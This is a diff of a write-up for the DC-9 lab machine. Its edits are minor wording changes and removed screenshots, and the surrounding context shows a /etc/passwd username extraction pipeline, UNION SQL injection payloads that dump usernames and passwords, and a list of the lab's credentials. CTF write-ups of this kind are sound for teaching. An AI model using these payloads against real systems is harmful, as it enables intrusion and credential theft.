@@ -126,7 +126,7 @@ It worked! I copy the result to my terminal to have a better look at it. I save 
 cat etc.passwd | tr " " "\n" | grep bash | tr ":/" " " | awk '{print $3}' | grep -v 0 > username
 ```
 
-Earlier, we see MySQL in the /etc/passwd. We do know that we can search for staff details. After testing it some trial and error in Burp > Repeater, the search bar is vulnerable to Union SQLi. Using the payload UNION SELECT 1,2,3,4,5,6 will return us the valid output. Anything more or less than 6 will not return us anything.
+Earlier, we see MySQL in the /etc/passwd. We do know that we can search for staff details. After testing it some trial and error in Burp > Repeater, the search bar is vulnerable to Union SQLi. Using the payload UNION SELECT 1,2,3,4,5,6 will return us a valid output. Anything more or less than 6 will not return us anything.
 
 {{<image src="/DC-9/union_sqli.png" position="center" style="border-radius: 8px;">}}
 
@@ -138,17 +138,7 @@ Moving forward, we can get all the important information we need.
 - Columns
 - Data (Username & Password)
 
-{{<image src="/DC-9/sql_version.png" position="center">}}
-
-{{<image src="/DC-9/sql_table.png" position="center">}}
-
-{{<image src="/DC-9/sql_columns.png" position="center">}}
-
-{{<image src="/DC-9/userpass_staffusers.png" position="center">}}
-
-{{<image src="/DC-9/userpass_usersuser.png" position="center">}}
-
-SQL injection UNION attacks that I used: 
+SQL injection UNION attacks that I used for this machine: 
 
 | Payload | Description |
 |---------|-------------|
@@ -159,7 +149,7 @@ SQL injection UNION attacks that I used:
 | Mary' UNION SELECT group_concat(Username,":",Password)2,3,4,5,6 FROM Staff.Users-\- -| Get Username and Password from Staff.Users |
 | Mary' UNION SELECT group_concat(username,":",password)2,3,4,5,6 FROM users.UserDetails-\- -| Get Username and Password from Users.UserDetails |
 
-Since i have a list of username during the LFI, i will only take the password and store it into a text file called `password`
+Since i have a list of username from the LFI, i will only take the password and store it into a text file called `password`
 
 ```
 echo -n 'marym:3kfs86sfd,julied:468sfdfsd2,fredf:4sfd87sfd1,barneyr:RocksOff,tomc:TC&TheBoyz,jerrym:B8m#48sd,wilmaf:Pebbles,bettyr:BamBam01,chandlerb:UrAG0D!,joeyt:Passw0rd,rachelg:yN72#dsd,rossg:ILoveRachel,monicag:3248dsds7s,phoebeb:smellycats,scoots:YR3BVxxxw87,janitor:Ilovepeepee,janitor2:Hawaii-Five-0' | tr "," "\n" | tr ":" " " | awk '{print $2}' > password
